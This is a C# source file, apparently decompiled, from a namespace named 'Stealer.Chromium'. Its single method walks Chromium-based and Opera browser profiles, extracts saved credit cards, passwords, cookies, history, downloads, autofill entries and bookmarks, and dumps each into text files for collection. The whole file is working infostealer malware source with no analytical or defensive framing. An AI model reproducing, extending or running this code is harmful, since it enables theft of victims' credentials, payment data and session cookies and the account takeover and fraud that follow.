using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer.Chromium
{
	// Token: 0x02000032 RID: 50
	internal sealed class Recovery
	{
		// Token: 0x060000DF RID: 223 RVA: 0x00007DE8 File Offset: 0x00005FE8
		public static void Run(string sSavePath)
		{
			if (!Directory.Exists(sSavePath))
			{
				Directory.CreateDirectory(sSavePath);
			}
			foreach (string text in Paths.sChromiumPswPaths)
			{
				string path;
				if (text.Contains("Opera Software"))
				{
					path = Paths.appdata + text;
				}
				else
				{
					path = Paths.lappdata + text;
				}
				if (Directory.Exists(path))
				{
					foreach (string str in Directory.GetDirectories(path))
					{
						string text2 = sSavePath + "\\" + Crypto.BrowserPathToAppName(text);
						Directory.CreateDirectory(text2);
						List<CreditCard> cCC = CreditCards.Get(str + "\\Web Data");
						List<Password> pPasswords = Passwords.Get(str + "\\Login Data");
						List<Cookie> cCookies = Cookies.Get(str + "\\Cookies");
						List<Site> sHistory = History.Get(str + "\\History");
						List<Site> sHistory2 = Downloads.Get(str + "\\History");
						List<AutoFill> aFills = Autofill.Get(str + "\\Web Data");
						List<Bookmark> bBookmarks = Bookmarks.Get(str + "\\Bookmarks");
						cBrowserUtils.WriteCreditCards(cCC, text2 + "\\CreditCards.txt");
						cBrowserUtils.WritePasswords(pPasswords, text2 + "\\Passwords.txt");
						cBrowserUtils.WriteCookies(cCookies, text2 + "\\Cookies.txt");
						cBrowserUtils.WriteHistory(sHistory, text2 + "\\History.txt");
						cBrowserUtils.WriteHistory(sHistory2, text2 + "\\Downloads.txt");
						cBrowserUtils.WriteAutoFill(aFills, text2 + "\\AutoFill.txt");
						cBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
					}
				}
			}
		}
	}
}
